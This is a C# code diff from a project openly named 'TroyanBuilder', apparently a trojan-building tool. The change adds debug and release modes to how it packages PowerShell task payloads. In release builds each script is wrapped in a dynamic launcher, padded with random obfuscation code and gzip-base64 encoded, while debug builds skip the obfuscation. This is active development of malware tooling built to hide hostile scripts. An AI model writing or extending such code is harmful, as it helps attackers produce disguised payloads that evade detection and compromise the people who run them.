@@ -1,4 +1,4 @@
-﻿using System.Text;
+using System.Text;
 
 namespace TroyanBuilder;
 
@@ -11,12 +11,12 @@ public partial class CustomBuilder
         public bool IsDo { get; set; }
         public bool Loaded { get; set; }
 
-        public string CryptedData(Dictionary<string, string> renamed)
+        /// <summary>Payload for program.ps1 task hashtable: release wraps each do-script in the dynamic launcher then gzip-base64; debug gzip-base64 only so CustomDecode still works at runtime.</summary>
+        public string TaskTablePayload(Dictionary<string, string> renamed)
         {
             var data = Data;
-
-            data = _builder.GeneratePowerShellScript(data, true);
-
+            if (_builder.Mode == TroyanBuildMode.Release)
+                data = _builder.GeneratePowerShellScript(data, true);
             return CustomCryptor.Encode(data);
         }
 
@@ -133,10 +133,17 @@ public partial class CustomBuilder
 
         if (sourceFile == "holder")
         {
-            var ddata = ReadSource("dynamic").Data;
-            result.Data = result.Data.Replace("###dynamic", ddata);
-            result.Data = result.Data.Replace("###random", new PowerShellObfuscator().RandomCode());
-
+            if (Mode == TroyanBuildMode.Debug)
+            {
+                result.Data = result.Data.Replace("###dynamic", "", StringComparison.Ordinal);
+                result.Data = result.Data.Replace("###random", "plain", StringComparison.Ordinal);
+            }
+            else
+            {
+                var ddata = ReadSource("dynamic").Data;
+                result.Data = result.Data.Replace("###dynamic", ddata, StringComparison.Ordinal);
+                result.Data = result.Data.Replace("###random", new PowerShellObfuscator().RandomCode(), StringComparison.Ordinal);
+            }
         }
 
         result.Loaded = true;
